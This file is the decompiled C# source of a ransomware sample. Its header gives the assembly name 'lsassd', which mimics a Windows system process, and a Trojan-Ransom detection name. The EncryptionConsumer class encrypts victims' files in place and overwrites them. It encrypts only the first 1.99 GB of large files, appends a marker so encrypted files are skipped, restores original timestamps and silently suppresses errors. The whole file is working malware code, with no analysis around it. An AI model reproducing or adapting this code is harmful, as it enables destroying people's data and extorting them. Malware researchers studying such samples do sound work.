// Decompiled with JetBrains decompiler
// Type: MOISHE.Core.EncryptionConsumer
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace MOISHE.Core
{
  public class EncryptionConsumer : AbstractConsumer<string>
  {
    public const int MOISHE_MAX = 1990000000;
    private Session A;
    private List<string> A;

    public RecursorItemSubmittedHandler OnItem { get; set; }

    public EncryptionConsumer(
      BlockingCollection<string> source,
      Session session,
      List<string> protections)
      : base(source)
    {
      this.A = session;
      this.A = new List<string>();
      this.A.AddRange((IEnumerable<string>) protections);
    }

    private static int A([In] Stream obj0)
    {
      byte[] buffer = new byte[4];
      long offset = obj0.Length - (long) buffer.Length;
      obj0.Seek(offset, SeekOrigin.Begin);
      obj0.Read(buffer, 0, buffer.Length);
      return BitConverter.ToInt32(buffer, 0);
    }

    private static EncryptionMetadata A([In] Stream obj0, [In] int obj1)
    {
      byte[] buffer = new byte[obj1];
      long offset = obj0.Length - (long) (4 + obj1);
      obj0.Seek(offset, SeekOrigin.Begin);
      obj0.Read(buffer, 0, buffer.Length);
      return EncryptionMetadata.Deserialize(buffer);
    }

    private static bool A([In] string obj0)
    {
      try
      {
        using (Stream stream = (Stream) new FileStream(obj0, FileMode.Open, FileAccess.Read))
        {
          int num = EncryptionConsumer.A(stream);
          if (num != 1578)
            return false;
          if (EncryptionConsumer.A(stream, num).Version != 1)
            return false;
        }
        return true;
      }
      catch
      {
        return false;
      }
    }

    private bool a([In] string obj0)
    {
      foreach (string str in this.A)
      {
        if (obj0.ToLower().Equals(str.ToLower()) || obj0.ToLower().EndsWith(str.ToLower()) || obj0.ToLower().StartsWith(str.ToLower()) || obj0.ToLower().Contains(str.ToLower()))
          return true;
      }
      return EncryptionConsumer.A(obj0);
    }

    protected override void OnItemArrived(string item)
    {
      if (this.a(item))
      {
        if (this.OnItem == null)
          return;
        this.OnItem(item);
      }
      else
      {
        try
        {
          this.A.RefreshKey();
          EncryptionMetadata metadata = this.A.CreateMetadata();
          FileInfo fileInfo = new FileInfo(item);
          DateTime creationTime = fileInfo.CreationTime;
          DateTime lastWriteTime = fileInfo.LastWriteTime;
          DateTime lastAccessTime = fileInfo.LastAccessTime;
          if (!fileInfo.Exists)
            return;
          if (fileInfo.Length <= 1990000000L)
            this.a(item, metadata);
          else
            this.A(item, metadata);
          fileInfo.CreationTime = creationTime;
          fileInfo.LastWriteTime = lastWriteTime;
          fileInfo.LastAccessTime = lastWriteTime;
        }
        catch (Exception ex)
        {
        }
        finally
        {
          if (this.OnItem != null)
            this.OnItem(item);
        }
      }
    }

    private void A([In] string obj0, [In] EncryptionMetadata obj1)
    {
      byte[] buffer1 = new byte[1990000000];
      Stream stream = (Stream) null;
      Stream underlying = (Stream) null;
      bool flag = false;
      try
      {
        stream = (Stream) File.Open(obj0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
        underlying = (Stream) File.Open(obj0, FileMode.Open, FileAccess.Write, FileShare.ReadWrite | FileShare.Delete);
        using (CryptoStream encryptor = this.A.CreateEncryptor(underlying, PaddingMode.None))
        {
          int count = stream.Read(buffer1, 0, buffer1.Length);
          if (count <= 0)
            return;
          encryptor.Write(buffer1, 0, count);
          encryptor.Flush();
          encryptor.FlushFinalBlock();
          obj1.Limit = count;
          byte[] buffer2 = obj1.Serialized();
          byte[] bytes = BitConverter.GetBytes(buffer2.Length);
          underlying.Seek(underlying.Length, SeekOrigin.Begin);
          underlying.Write(buffer2, 0, buffer2.Length);
          underlying.Write(bytes, 0, bytes.Length);
          underlying.Flush();
          flag = true;
        }
      }
      catch (Exception ex)
      {
      }
      finally
      {
        stream?.Close();
        underlying?.Close();
        int num = flag ? 1 : 0;
      }
    }

    private void a([In] string obj0, [In] EncryptionMetadata obj1)
    {
      bool flag = false;
      try
      {
        byte[] buffer1 = File.ReadAllBytes(obj0);
        MemoryStream underlying = new MemoryStream();
        using (CryptoStream encryptor = this.A.CreateEncryptor((Stream) underlying, PaddingMode.PKCS7))
        {
          encryptor.Write(buffer1, 0, buffer1.Length);
          encryptor.Flush();
          encryptor.FlushFinalBlock();
        }
        byte[] array = underlying.ToArray();
        underlying.Dispose();
        obj1.Limit = buffer1.Length;
        byte[] buffer2 = obj1.Serialized();
        byte[] bytes = BitConverter.GetBytes(buffer2.Length);
        using (FileStream fileStream = new FileStream(obj0, FileMode.Truncate, FileAccess.Write))
        {
          fileStream.Write(array, 0, array.Length);
          fileStream.Write(buffer2, 0, buffer2.Length);
          fileStream.Write(bytes, 0, bytes.Length);
          fileStream.Flush();
        }
        flag = true;
      }
      catch (Exception ex)
      {
      }
      finally
      {
        int num = flag ? 1 : 0;
      }
    }
  }
}
